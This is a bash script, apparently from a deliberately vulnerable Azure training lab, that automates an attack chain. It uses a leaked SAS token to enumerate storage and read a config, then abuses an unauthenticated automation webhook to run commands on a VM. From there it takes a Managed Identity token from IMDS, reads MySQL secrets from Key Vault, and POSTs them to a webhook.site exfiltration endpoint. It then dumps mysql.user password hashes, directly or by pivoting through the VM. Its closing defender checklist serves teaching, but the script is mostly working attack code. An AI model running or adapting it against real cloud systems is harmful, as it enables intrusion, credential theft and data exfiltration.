#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Azure - Scenario 4                 ===" "${RESET}"
  printf "%sSAS Token → Automation Account → VM → MySQL Exfiltration%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Enumerate storage account using leaked SAS token\n"
  printf "  • Step 2. Download automation configuration blob\n"
  printf "  • Step 3. Extract webhook URL and infrastructure details\n"
  printf "  • Step 4. Invoke webhook with command to harvest credentials\n"
  printf "  • Step 5. Exfiltrate Key Vault secrets (MySQL credentials)\n"
  printf "  • Step 6. Demonstrate database access capability\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Collect inputs
#############################################
printf "\n"
printf "Enter the leaked storage URL (simulating discovery in logs/docs):\n\n"
printf "  Example: https://storageaccount.blob.core.windows.net/container/blob?sv=...\n\n"

read -r -p "  Leaked URL: " LEAKED_URL

if [ -z "$LEAKED_URL" ]; then
  err "Storage URL is required"
  exit 1
fi

# Parse storage account name from URL
# URL format: https://<storage_account>.blob.core.windows.net/...
STORAGE_ACCOUNT="$(echo "$LEAKED_URL" | sed -n 's|https://\([^.]*\)\.blob\.core\.windows\.net.*|\1|p')"

# Parse SAS token from URL (everything after and including '?')
SAS_TOKEN="$(echo "$LEAKED_URL" | grep -o '?.*')"

if [ -z "$STORAGE_ACCOUNT" ]; then
  err "Could not parse storage account name from URL"
  exit 1
fi

if [ -z "$SAS_TOKEN" ]; then
  err "Could not parse SAS token from URL"
  exit 1
fi

ok "URL parsed successfully"
info "Storage Account: ${YELLOW}${STORAGE_ACCOUNT}${RESET}"
info "SAS Token: ${YELLOW}${SAS_TOKEN:0:50}...${RESET}"

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1. Enumerate storage account using leaked SAS token
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Enumerate storage account using leaked SAS token  ===" "${RESET}"

step "Testing storage account connectivity"

STORAGE_BASE_URL="https://${STORAGE_ACCOUNT}.blob.core.windows.net"

spin_start "Checking if storage account is reachable"
set +e
CONTAINERS_RESP="$(curl -sS "${STORAGE_BASE_URL}/${SAS_TOKEN}&comp=list" 2>/dev/null)"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ] || echo "$CONTAINERS_RESP" | grep -q "AuthenticationFailed\|AuthorizationFailure"; then
  err "Failed to access storage account"
  echo "$CONTAINERS_RESP" | head -10
  exit 1
fi

ok "Storage account accessible"

step "Listing containers in storage account"

spin_start "Enumerating containers"
set +e
CONTAINERS_RESP="$(curl -sS "${STORAGE_BASE_URL}/${SAS_TOKEN}&comp=list")"
set -e
spin_stop

# Parse container names from XML response
CONTAINERS="$(echo "$CONTAINERS_RESP" | grep -oP '(?<=<Name>)[^<]+' || true)"

if [ -z "$CONTAINERS" ]; then
  err "No containers found or unable to parse response"
  exit 1
fi

ok "Containers enumerated"
printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "📦 Storage Containers" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
echo "$CONTAINERS" | while read -r container; do
  printf "  • %s%s%s\n" "$YELLOW" "$container" "$RESET"
done
printf "%s\n" "---------------------------------------------------------------------"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We successfully accessed the storage account using the ${MAGENTA}leaked SAS token${RESET}.\n\n"
printf "SAS (Shared Access Signature) tokens are commonly leaked through:\n"
printf "  • Hardcoded values in source code pushed to public repos\n"
printf "  • CI/CD pipeline logs with verbose output\n"
printf "  • Developer documentation or wikis\n"
printf "  • Slack/Teams messages or email threads\n\n"
printf "Even with ${YELLOW}read-only${RESET} permissions, SAS tokens can expose:\n"
printf "  • Configuration files with sensitive details\n"
printf "  • Backup files containing credentials\n"
printf "  • Internal documentation revealing infrastructure\n\n"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Download automation configuration blob
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Download automation configuration blob  ===" "${RESET}"

step "Listing blobs in 'automation-configs' container"

spin_start "Enumerating blobs"
set +e
BLOBS_RESP="$(curl -sS "${STORAGE_BASE_URL}/automation-configs${SAS_TOKEN}&restype=container&comp=list")"
set -e
spin_stop

BLOBS="$(echo "$BLOBS_RESP" | grep -oP '(?<=<Name>)[^<]+' || true)"

ok "Blobs enumerated"
info "Found blobs:"
echo "$BLOBS" | while read -r blob; do
  printf "    • %s%s%s\n" "$YELLOW" "$blob" "$RESET"
done

step "Downloading automation_config.json"

spin_start "Downloading configuration file"
set +e
CONFIG_CONTENT="$(curl -sS "${STORAGE_BASE_URL}/automation-configs/automation_config.json${SAS_TOKEN}")"
set -e
spin_stop

if echo "$CONFIG_CONTENT" | jq . >/dev/null 2>&1; then
  ok "Configuration file downloaded!"
else
  err "Failed to download or parse configuration"
  echo "$CONFIG_CONTENT"
  exit 1
fi

printf "\n%s%s%s\n" "${BOLD}${RED}" "🔑 DISCOVERED CONFIGURATION" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
echo "$CONFIG_CONTENT" | jq .
printf "%s\n" "---------------------------------------------------------------------"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered a configuration file containing sensitive infrastructure details:\n\n"
printf "  • ${MAGENTA}Automation Account${RESET}: Name and resource group for Azure Automation\n"
printf "  • ${MAGENTA}Target VM${RESET}: The VM that runbooks can execute commands on\n"
printf "  • ${MAGENTA}Key Vault${RESET}: Contains database credentials\n"
printf "  • ${RED}Webhook URL${RESET}: Allows triggering automation runbooks remotely!\n\n"
printf "The webhook URL is the critical finding — it allows us to execute\n"
printf "arbitrary commands on the target VM without Azure credentials.\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Extract webhook URL and infrastructure details
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Extract webhook URL and infrastructure details  ===" "${RESET}"

step "Parsing configuration for attack parameters"

# Extract values from config
AUTOMATION_ACCOUNT="$(echo "$CONFIG_CONTENT" | jq -r '.automation_account.name')"
RESOURCE_GROUP="$(echo "$CONFIG_CONTENT" | jq -r '.automation_account.resource_group')"
TARGET_VM="$(echo "$CONFIG_CONTENT" | jq -r '.target_vm.name')"
KEY_VAULT_NAME="$(echo "$CONFIG_CONTENT" | jq -r '.key_vault.name')"
KEY_VAULT_URL="$(echo "$CONFIG_CONTENT" | jq -r '.key_vault.url')"
WEBHOOK_URL="$(echo "$CONFIG_CONTENT" | jq -r '.maintenance_webhook.url')"

if [ -z "$WEBHOOK_URL" ] || [ "$WEBHOOK_URL" = "null" ]; then
  err "Webhook URL not found in configuration"
  exit 1
fi

ok "Configuration parsed successfully"

printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "🎯 Attack Parameters" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
printf "  Automation Account : %s%s%s\n" "$YELLOW" "$AUTOMATION_ACCOUNT" "$RESET"
printf "  Resource Group     : %s%s%s\n" "$YELLOW" "$RESOURCE_GROUP" "$RESET"
printf "  Target VM          : %s%s%s\n" "$YELLOW" "$TARGET_VM" "$RESET"
printf "  Key Vault          : %s%s%s\n" "$YELLOW" "$KEY_VAULT_NAME" "$RESET"
printf "  Key Vault URL      : %s%s%s\n" "$YELLOW" "$KEY_VAULT_URL" "$RESET"
printf "  Webhook URL        : %s%s%s\n" "$RED" "${WEBHOOK_URL:0:80}..." "$RESET"
printf "%s\n" "---------------------------------------------------------------------"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We have everything needed to execute the attack:\n\n"
printf "The ${RED}webhook URL${RESET} is particularly dangerous because:\n"
printf "  • It requires ${YELLOW}no authentication${RESET} — anyone with the URL can trigger it\n"
printf "  • The runbook accepts a ${YELLOW}command parameter${RESET} in the request body\n"
printf "  • Commands are executed on the target VM via Azure Run Command\n"
printf "  • The VM has a Managed Identity with Key Vault access\n\n"
printf "Attack chain:\n"
printf "  Webhook → Runbook → Run Command → VM → Managed Identity → Key Vault\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Invoke webhook with command to harvest credentials
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Invoke webhook with command to harvest credentials  ===" "${RESET}"

step "Preparing credential harvesting command"

# Command to get Key Vault token from IMDS and fetch secrets
HARVEST_COMMAND='#!/bin/bash
# Get Key Vault access token from Managed Identity
TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r ".access_token")

# List secrets in Key Vault
echo "=== KEY VAULT SECRETS ==="
SECRETS=$(curl -s -H "Authorization: Bearer $TOKEN" "'"${KEY_VAULT_URL}"'secrets?api-version=7.4")
echo "$SECRETS" | jq -r ".value[].id"

# Get MySQL connection string
echo ""
echo "=== MYSQL CONNECTION STRING ==="
curl -s -H "Authorization: Bearer $TOKEN" "'"${KEY_VAULT_URL}"'secrets/mysql-connection-string?api-version=7.4" | jq -r ".value"

# Get MySQL password
echo ""
echo "=== MYSQL PASSWORD ==="
curl -s -H "Authorization: Bearer $TOKEN" "'"${KEY_VAULT_URL}"'secrets/mysql-admin-password?api-version=7.4" | jq -r ".value"
'

info "Credential harvesting command prepared"
printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "📜 Command to Execute on Target VM" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
printf "%s\n" "$HARVEST_COMMAND"
printf "%s\n" "---------------------------------------------------------------------"

step "Invoking webhook to trigger command execution"

spin_start "Sending POST request to webhook"
set +e
# Use jq to properly JSON-encode the command (handles newlines, quotes, special chars)
WEBHOOK_RESPONSE="$(jq -n --arg cmd "$HARVEST_COMMAND" '{command: $cmd}' | \
  curl -sS -X POST \
    -H "Content-Type: application/json" \
    -d @- \
    "$WEBHOOK_URL" 2>&1)"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "Failed to invoke webhook"
  echo "$WEBHOOK_RESPONSE"
  exit 1
fi

ok "Webhook invoked successfully!"

# Parse job ID from response if available
JOB_ID="$(echo "$WEBHOOK_RESPONSE" | jq -r '.JobIds[0] // empty' 2>/dev/null || true)"

if [ -n "$JOB_ID" ]; then
  info "Automation Job ID: ${YELLOW}${JOB_ID}${RESET}"
fi

printf "\n%s%s%s\n" "${BOLD}${YELLOW}" "⏳ Webhook Response" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
echo "$WEBHOOK_RESPONSE" | jq . 2>/dev/null || echo "$WEBHOOK_RESPONSE"
printf "%s\n" "---------------------------------------------------------------------"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We triggered the vulnerable runbook via its webhook endpoint.\n\n"
printf "What happens when the webhook is invoked:\n"
printf "  1. Azure Automation receives the webhook request\n"
printf "  2. The runbook starts with our command in the ${YELLOW}WebhookData${RESET} parameter\n"
printf "  3. Runbook authenticates using its Managed Identity\n"
printf "  4. Runbook calls ${MAGENTA}Invoke-AzVMRunCommand${RESET} on the target VM\n"
printf "  5. Our command executes on the VM with VM's Managed Identity context\n"
printf "  6. The command fetches Key Vault secrets and outputs them\n\n"
printf "The job runs asynchronously. In a real attack, the command would:\n"
printf "  • Exfiltrate data to an attacker-controlled endpoint\n"
printf "  • Establish persistence (reverse shell, scheduled task, etc.)\n"
printf "  • Pivot to other resources accessible by the VM\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. Exfiltrate credentials and access database
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Exfiltrate credentials and access database  ===" "${RESET}"

step "Setting up exfiltration endpoint"

printf "\nTo capture the exfiltrated credentials, we need a callback URL.\n"
printf "You can create one at: ${CYAN}https://webhook.site${RESET}\n\n"
printf "  1. Go to https://webhook.site\n"
printf "  2. Copy your unique URL (e.g., https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)\n\n"

read -r -p "  Enter your webhook.site URL (or press Enter to skip): " EXFIL_URL

if [ -n "$EXFIL_URL" ]; then
  ok "Exfiltration endpoint configured"
  
  # Extract the webhook.site token for API access
  WEBHOOK_TOKEN="$(echo "$EXFIL_URL" | grep -oP 'webhook\.site/\K[a-f0-9-]+')"
  
  step "Crafting exfiltration command"
  
  # Command that exfiltrates credentials to webhook.site
  EXFIL_COMMAND='#!/bin/bash
# Get Key Vault access token from Managed Identity
TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r ".access_token")

# Get MySQL connection string (returns JSON object)
CONN=$(curl -s -H "Authorization: Bearer $TOKEN" "'"${KEY_VAULT_URL}"'secrets/mysql-connection-string?api-version=7.4" | jq -r ".value")

# Get MySQL password  
PASS=$(curl -s -H "Authorization: Bearer $TOKEN" "'"${KEY_VAULT_URL}"'secrets/mysql-admin-password?api-version=7.4" | jq -r ".value")

# Exfiltrate to attacker endpoint (use jq for proper JSON encoding to handle special chars)
jq -n --argjson conn "$CONN" --arg pass "$PASS" "{connection: \$conn, password: \$pass}" | \
  curl -s -X POST "'"${EXFIL_URL}"'" -H "Content-Type: application/json" -d @-
'

  info "Exfiltration command prepared"
  
  step "Invoking webhook with exfiltration command"
  
  spin_start "Triggering credential exfiltration"
  set +e
  # Use jq to properly JSON-encode the command (handles newlines, quotes, special chars)
  EXFIL_RESPONSE="$(jq -n --arg cmd "$EXFIL_COMMAND" '{command: $cmd}' | \
    curl -sS -X POST \
      -H "Content-Type: application/json" \
      -d @- \
      "$WEBHOOK_URL" 2>&1)"
  EXFIL_RC=$?
  set -e
  spin_stop
  
  if [ $EXFIL_RC -ne 0 ]; then
    err "Webhook call may have failed (curl exit code: $EXFIL_RC)"
    echo "$EXFIL_RESPONSE"
  else
    ok "Exfiltration command sent"
    
    # Parse and display job ID for debugging
    EXFIL_JOB_ID="$(echo "$EXFIL_RESPONSE" | jq -r '.JobIds[0] // empty' 2>/dev/null || true)"
    if [ -n "$EXFIL_JOB_ID" ]; then
      info "Automation Job ID: ${YELLOW}${EXFIL_JOB_ID}${RESET}"
    fi
  fi
  
  step "Waiting for credentials (this may take 1-2 minutes)"
  info "The command needs time to: start job → run on VM → fetch secrets → POST to webhook"
  
  MYSQL_HOST=""
  MYSQL_USER=""
  MYSQL_PASS=""
  MYSQL_DB=""
  
  # Poll webhook.site API for exfiltrated data
  for i in {1..20}; do
    spin_start "Polling for exfiltrated data (attempt $i/20)"
    sleep 10
    spin_stop
    
    # Query webhook.site API for received requests
    set +e
    WEBHOOK_DATA="$(curl -sS "https://webhook.site/token/${WEBHOOK_TOKEN}/requests?sorting=newest" 2>/dev/null)"
    set -e
    
    # Check if we have any requests with our data
    if echo "$WEBHOOK_DATA" | jq -e '.data[0].content' >/dev/null 2>&1; then
      EXFIL_CONTENT="$(echo "$WEBHOOK_DATA" | jq -r '.data[0].content' 2>/dev/null)"
      
      if echo "$EXFIL_CONTENT" | jq -e '.password' >/dev/null 2>&1; then
        ok "Credentials received!"
        
        # Parse the exfiltrated data
        MYSQL_PASS="$(echo "$EXFIL_CONTENT" | jq -r '.password')"
        CONN_JSON="$(echo "$EXFIL_CONTENT" | jq -r '.connection')"
        
        if [ -n "$CONN_JSON" ] && [ "$CONN_JSON" != "null" ]; then
          MYSQL_HOST="$(echo "$CONN_JSON" | jq -r '.host // empty')"
          MYSQL_USER="$(echo "$CONN_JSON" | jq -r '.username // empty')"
          MYSQL_DB="$(echo "$CONN_JSON" | jq -r '.database // empty')"
        fi
        
        break
      fi
    fi
    
    if [ $i -eq 20 ]; then
      info "Timeout waiting for credentials. The automation job may still be running."
      info "Check https://webhook.site/#!/${WEBHOOK_TOKEN} manually"
    fi
  done
  
  if [ -n "$MYSQL_PASS" ]; then
    printf "\n%s%s%s\n" "${BOLD}${RED}" "🔓 EXFILTRATED CREDENTIALS" "${RESET}"
    printf "%s\n" "---------------------------------------------------------------------"
    printf "  MySQL Host     : %s%s%s\n" "$YELLOW" "${MYSQL_HOST:-unknown}" "$RESET"
    printf "  MySQL Username : %s%s%s\n" "$YELLOW" "${MYSQL_USER:-mysqladmin}" "$RESET"
    printf "  MySQL Password : %s%s%s\n" "$RED" "$MYSQL_PASS" "$RESET"
    printf "  MySQL Database : %s%s%s\n" "$YELLOW" "${MYSQL_DB:-sensitive}" "$RESET"
    printf "%s\n" "---------------------------------------------------------------------"
  fi
  
else
  info "Skipping live exfiltration - no webhook URL provided"
  info "For the demo, you can provide MySQL credentials manually"
  
  printf "\nYou can get the credentials from Terraform:\n"
  printf "  ${CYAN}terraform output -json | jq -r '.mysql_password.value // empty'${RESET}\n\n"
fi

step "Database access"

# If we don't have credentials from exfil, ask for them
if [ -z "$MYSQL_PASS" ]; then
  printf "\nEnter MySQL credentials to demonstrate database access:\n\n"
  read -r -p "  MySQL Host (FQDN): " MYSQL_HOST
  read -r -p "  MySQL Password: " MYSQL_PASS
  MYSQL_USER="mysqladmin"
  MYSQL_DB="sensitive"
fi

if [ -n "$MYSQL_HOST" ] && [ -n "$MYSQL_PASS" ]; then
  DIRECT_CONNECTION_SUCCESS=false
  
  # Check if mysql client is available for direct connection attempt
  if command -v mysql >/dev/null 2>&1; then
    step "Attempting direct database connection (from attacker machine)"
    
    printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "🗄️ Direct Database Connection" "${RESET}"
    printf "%s\n" "---------------------------------------------------------------------"
    
    spin_start "Attempting MySQL connection"
    set +e
    # Try to connect and run a simple query
    MYSQL_RESULT="$(mysql -h "$MYSQL_HOST" -u "$MYSQL_USER" -p"$MYSQL_PASS" "$MYSQL_DB" \
      --connect-timeout=10 -e "SELECT 'CONNECTION SUCCESSFUL' AS status; SHOW TABLES;" 2>&1)"
    MYSQL_RC=$?
    set -e
    spin_stop
    
    if [ $MYSQL_RC -eq 0 ]; then
      ok "Successfully connected to MySQL database directly!"
      DIRECT_CONNECTION_SUCCESS=true
      printf "\n%s\n" "$MYSQL_RESULT"
      
      # Exfiltrate MySQL system users - the built-in credentials table
      step "Exfiltrating mysql.user table (database credentials)"
      
      set +e
      MYSQL_USERS="$(mysql -h "$MYSQL_HOST" -u "$MYSQL_USER" -p"$MYSQL_PASS" \
        --connect-timeout=10 -e "SELECT User, Host, authentication_string, account_locked FROM mysql.user;" 2>/dev/null)"
      set -e
      
      if [ -n "$MYSQL_USERS" ]; then
        printf "\n%s%s%s\n" "${BOLD}${RED}" "mysql.user TABLE (database accounts + password hashes)" "${RESET}"
        printf "%s\n" "$MYSQL_USERS"
      else
        info "Could not read mysql.user (insufficient privileges)"
      fi
    else
      info "Direct connection failed (firewall likely blocks external IPs)"
      info "Error: $MYSQL_RESULT"
    fi
    
    printf "%s\n" "---------------------------------------------------------------------"
  else
    info "mysql client not installed locally"
  fi
  
  # If direct connection failed, try through the VM via automation webhook
  if [ "$DIRECT_CONNECTION_SUCCESS" = false ] && [ -n "$WEBHOOK_URL" ]; then
    step "Attempting database connection through VM (pivoting)"
    
    printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "🗄️ Database Connection via VM Pivot" "${RESET}"
    printf "%s\n" "---------------------------------------------------------------------"
    info "Direct connection blocked - using compromised VM as pivot point"
    
    # Prepare command to run on VM - use base64 encoding to safely pass credentials
    # This avoids shell quoting issues with special characters in password
    MYSQL_PASS_B64="$(printf '%s' "$MYSQL_PASS" | base64)"
    
    # Determine where to send results: webhook.site if available, otherwise just job output
    if [ -n "${EXFIL_URL:-}" ] && [ -n "${WEBHOOK_TOKEN:-}" ]; then
      RESULT_EXFIL_SNIPPET="
# Exfiltrate query results to attacker endpoint
jq -n --arg result \"\$RESULT\" --arg status \"\$DB_RC\" '{db_query_result: \$result, exit_code: \$status}' | \\
  curl -s -X POST '${EXFIL_URL}' -H 'Content-Type: application/json' -d @-
"
    else
      RESULT_EXFIL_SNIPPET=""
    fi
    
    DB_QUERY_COMMAND="#!/bin/bash
# Query the database from the VM (which has network access)
# Password is base64-encoded to handle special characters safely
MYSQL_HOST='${MYSQL_HOST}'
MYSQL_USER='${MYSQL_USER}'
MYSQL_PASS=\$(echo '${MYSQL_PASS_B64}' | base64 -d)
MYSQL_OPTS=\"-h \$MYSQL_HOST -u \$MYSQL_USER -p\$MYSQL_PASS --connect-timeout=10\"

RESULT=\"=== CONNECTION TEST ===
\$(mysql \$MYSQL_OPTS -e \"SELECT 'CONNECTION SUCCESSFUL' AS status;\" 2>&1)

=== mysql.user TABLE (database accounts + password hashes) ===
\$(mysql \$MYSQL_OPTS -e \"SELECT User, Host, authentication_string, account_locked FROM mysql.user;\" 2>&1)\"
DB_RC=\$?

echo \"\$RESULT\"
${RESULT_EXFIL_SNIPPET}"
    
    spin_start "Executing database query on VM"
    set +e
    VM_DB_RESPONSE="$(jq -n --arg cmd "$DB_QUERY_COMMAND" '{command: $cmd}' | \
      curl -sS -X POST \
        -H "Content-Type: application/json" \
        -d @- \
        "$WEBHOOK_URL" 2>&1)"
    VM_DB_RC=$?
    set -e
    spin_stop
    
    if [ $VM_DB_RC -eq 0 ]; then
      VM_DB_JOB_ID="$(echo "$VM_DB_RESPONSE" | jq -r '.JobIds[0] // empty' 2>/dev/null || true)"
      
      if [ -n "$VM_DB_JOB_ID" ]; then
        ok "Database query command sent to VM"
        info "Automation Job ID: ${YELLOW}${VM_DB_JOB_ID}${RESET}"
        
        if [ -n "${WEBHOOK_TOKEN:-}" ]; then
          # Poll webhook.site for exfiltrated database results
          info "Waiting for DB query results via exfiltration endpoint..."
          
          VM_DB_OUTPUT=""
          for attempt in {1..20}; do
            spin_start "Polling for DB query results (attempt $attempt/20)"
            sleep 10
            spin_stop
            
            set +e
            WEBHOOK_DATA="$(curl -sS "https://webhook.site/token/${WEBHOOK_TOKEN}/requests?sorting=newest" 2>/dev/null)"
            set -e
            
            # Look for requests containing db_query_result (distinct from credential exfil)
            DB_RESULT_CONTENT="$(echo "$WEBHOOK_DATA" | jq -r '[.data[] | select(.content | test("db_query_result"))] | first | .content // empty' 2>/dev/null)"
            
            if [ -n "$DB_RESULT_CONTENT" ]; then
              VM_DB_OUTPUT="$(echo "$DB_RESULT_CONTENT" | jq -r '.db_query_result // empty' 2>/dev/null)"
              if [ -n "$VM_DB_OUTPUT" ]; then
                ok "Database query results received!"
                break
              fi
            fi
          done
          
          if [ -n "$VM_DB_OUTPUT" ]; then
            printf "\n%s%s%s\n" "${BOLD}${YELLOW}" "📋 VM Database Query Output" "${RESET}"
            printf "%s\n" "---------------------------------------------------------------------"
            printf "%s\n" "$VM_DB_OUTPUT"
            printf "%s\n" "---------------------------------------------------------------------"
          else
            info "Timeout waiting for results. The automation job may still be running."
            info "Check https://webhook.site/#!/${WEBHOOK_TOKEN} manually"
          fi
        else
          info "No exfiltration endpoint available to receive results"
          info "Check Azure Automation job output in the portal for Job ID: ${YELLOW}${VM_DB_JOB_ID}${RESET}"
        fi
      else
        err "Failed to trigger VM database query"
        echo "$VM_DB_RESPONSE"
      fi
    else
      err "Failed to send command to webhook"
    fi
    
    printf "%s\n" "---------------------------------------------------------------------"
  elif [ "$DIRECT_CONNECTION_SUCCESS" = false ]; then
    printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "🗄️ Database Connection" "${RESET}"
    printf "%s\n" "---------------------------------------------------------------------"
    info "Direct connection failed and no webhook URL available for VM pivot"
    printf "\nTo connect to the database manually:\n\n"
    printf "  ${CYAN}mysql -h %s -u %s -p'%s' %s${RESET}\n\n" "$MYSQL_HOST" "${MYSQL_USER:-mysqladmin}" "$MYSQL_PASS" "${MYSQL_DB:-sensitive}"
    printf "Or install mysql client:\n"
    printf "  macOS: ${CYAN}brew install mysql-client${RESET}\n"
    printf "  Linux: ${CYAN}sudo apt install mysql-client${RESET}\n"
    printf "%s\n" "---------------------------------------------------------------------"
  fi
else
  info "No credentials available - skipping database connection demo"
fi

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We demonstrated the full attack chain:\n\n"
printf "  1. ${RED}SAS Token Exposure${RESET} → Storage enumeration\n"
printf "  2. ${RED}Sensitive Config${RESET} → Webhook URL discovery\n"
printf "  3. ${RED}Command Injection${RESET} → Arbitrary code execution on VM\n"
printf "  4. ${RED}Identity Abuse${RESET} → Key Vault access via Managed Identity\n"
printf "  5. ${RED}Data Exfiltration${RESET} → Credentials sent to attacker\n"
printf "  6. ${RED}Database Access${RESET} → Full access to sensitive data\n\n"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Attack Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Attack Summary  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "✅ Attack Chain Completed!" "${RESET}"
printf "\n%s\n" "Attack chain executed:"
printf "  1. ✓ Enumerated storage account using leaked SAS token\n"
printf "  2. ✓ Downloaded automation configuration blob\n"
printf "  3. ✓ Extracted webhook URL and infrastructure details\n"
printf "  4. ✓ Invoked webhook with credential harvesting command\n"
printf "  5. ✓ Exfiltrated MySQL credentials via webhook callback\n"
printf "  6. ✓ Demonstrated database access with stolen credentials\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Arbitrary command execution on target VM\n"
printf "  • Key Vault secrets exfiltrated (MySQL credentials)\n"
printf "  • Full database access achieved\n"
printf "  • Lateral movement opportunities via VM Managed Identity\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • SAS token usage from unexpected IPs/locations\n"
printf "  • Automation webhook invocations with suspicious payloads\n"
printf "  • Run Command executions on VMs\n"
printf "  • IMDS token requests for Key Vault resources\n"
printf "  • Key Vault secret access from VM Managed Identities\n"
printf "  • Database connections from unexpected sources\n"
printf "  • Outbound HTTP requests to unknown endpoints (exfiltration)\n\n"

printf "%s%s%s\n" "${BOLD}${YELLOW}" "📋 Next Steps for Blue Team:" "${RESET}"
printf "  1. Review Storage Account access logs for SAS token usage\n"
printf "  2. Check Automation Account job history for suspicious runbook executions\n"
printf "  3. Examine VM Run Command activity in Activity Log\n"
printf "  4. Audit Key Vault access logs for unauthorized secret reads\n"
printf "  5. Review MySQL audit logs for unexpected connections\n"
printf "  6. Check NSG flow logs for outbound connections to suspicious IPs\n\n"
